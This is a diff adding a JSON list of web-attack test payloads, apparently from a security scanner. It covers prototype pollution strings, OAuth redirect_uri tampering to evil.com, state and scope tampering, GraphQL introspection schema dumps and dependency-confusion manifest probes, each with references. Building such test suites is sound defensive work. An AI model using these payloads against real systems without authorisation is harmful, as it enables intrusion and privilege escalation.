@@ -1,0 +1,74 @@
+[
+  {
+    "id": "mod-001", "family": "modern_injection", "subtype": "prototype_pollution",
+    "payload_string": "{\"__proto__\":{\"polluted\":\"injected_1337\"}}", "context": "json",
+    "description": "Prototype Pollution - Basic __proto__ JSON payload",
+    "references": ["https://portswigger.net/web-security/prototype-pollution"], "platform_specific": {"nodejs": true}
+  },
+  {
+    "id": "mod-002", "family": "modern_injection", "subtype": "prototype_pollution",
+    "payload_string": "{\"constructor\":{\"prototype\":{\"polluted\":\"injected_1337\"}}}", "context": "json",
+    "description": "Prototype Pollution - constructor.prototype JSON payload",
+    "references": ["https://portswigger.net/web-security/prototype-pollution"], "platform_specific": {"nodejs": true}
+  },
+  {
+    "id": "mod-003", "family": "modern_injection", "subtype": "prototype_pollution",
+    "payload_string": "__proto__[polluted]=injected_1337", "context": "string",
+    "description": "Prototype Pollution - URL parameter __proto__",
+    "references": ["https://portswigger.net/web-security/prototype-pollution"], "platform_specific": {"nodejs": true}
+  },
+  {
+    "id": "mod-004", "family": "modern_injection", "subtype": "prototype_pollution",
+    "payload_string": "constructor[prototype][polluted]=injected_1337", "context": "string",
+    "description": "Prototype Pollution - URL parameter constructor.prototype",
+    "references": ["https://portswigger.net/web-security/prototype-pollution"], "platform_specific": {"nodejs": true}
+  },
+  {
+    "id": "mod-005", "family": "modern_injection", "subtype": "oauth_injection",
+    "payload_string": "https://evil.com", "context": "string",
+    "description": "OAuth Injection - redirect_uri tampering",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses"], "platform_specific": {}
+  },
+  {
+    "id": "mod-006", "family": "modern_injection", "subtype": "oauth_injection",
+    "payload_string": "evil_state_12345", "context": "string",
+    "description": "OAuth Injection - state parameter tampering / CSRF",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses"], "platform_specific": {}
+  },
+  {
+    "id": "mod-007", "family": "modern_injection", "subtype": "oauth_injection",
+    "payload_string": "openid profile email admin", "context": "string",
+    "description": "OAuth Injection - scope escalation",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses"], "platform_specific": {}
+  },
+  {
+    "id": "mod-008", "family": "modern_injection", "subtype": "graphql_introspection",
+    "payload_string": "{\"query\":\"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }\"}", "context": "json",
+    "description": "GraphQL Introspection - Full schema dump",
+    "references": ["https://graphql.org/learn/introspection/"], "platform_specific": {}
+  },
+  {
+    "id": "mod-009", "family": "modern_injection", "subtype": "graphql_introspection",
+    "payload_string": "{\"query\":\"{ __schema { types { name } } }\"}", "context": "json",
+    "description": "GraphQL Introspection - Type enumeration",
+    "references": ["https://graphql.org/learn/introspection/"], "platform_specific": {}
+  },
+  {
+    "id": "mod-010", "family": "modern_injection", "subtype": "graphql_introspection",
+    "payload_string": "{\"query\":\"{ __type(name: \\\"User\\\") { name fields { name type { name kind ofType { name kind } } } } }\"}", "context": "json",
+    "description": "GraphQL Introspection - Specific type (User) inspection",
+    "references": ["https://graphql.org/learn/introspection/"], "platform_specific": {}
+  },
+  {
+    "id": "mod-011", "family": "modern_injection", "subtype": "dependency_confusion",
+    "payload_string": "package.json", "context": "string",
+    "description": "Dependency Confusion - Passive manifest probe (Node.js)",
+    "references": ["https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610"], "platform_specific": {"nodejs": true}
+  },
+  {
+    "id": "mod-012", "family": "modern_injection", "subtype": "dependency_confusion",
+    "payload_string": "requirements.txt", "context": "string",
+    "description": "Dependency Confusion - Passive manifest probe (Python)",
+    "references": ["https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610"], "platform_specific": {"python": true}
+  }
+]
